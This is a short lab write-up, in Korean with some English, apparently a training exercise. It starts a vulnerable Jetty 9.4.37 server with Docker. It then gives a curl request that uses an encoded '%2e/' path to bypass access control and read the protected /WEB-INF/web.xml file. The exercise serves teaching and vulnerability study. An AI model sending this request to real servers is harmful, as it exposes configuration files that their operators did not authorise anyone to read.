@@ -1,0 +1,16 @@
+cd C:\Users\jammy\Desktop\school\WHS
+이클립스 제티는 Java 웹 서버 및 Java 서브렛 컨테이너입니다.
+
+취약한 애플리케이션
+Execute the following command to start a Jetty 9.4.37 server.
+
+docker compose up -d
+
+그후,  http://your-ip:8080 를 방문한다. 
+
+공격
+민감한 파일  web.xml 은  /WEB-INF/web.xml을 통해서 접속할 수 없다.
+
+ 고로, %2e/를 사용하여 우회할 수 있다.
+
+curl -v 'http://192.168.1.162:8080/%2e/WEB-INF/web.xml'
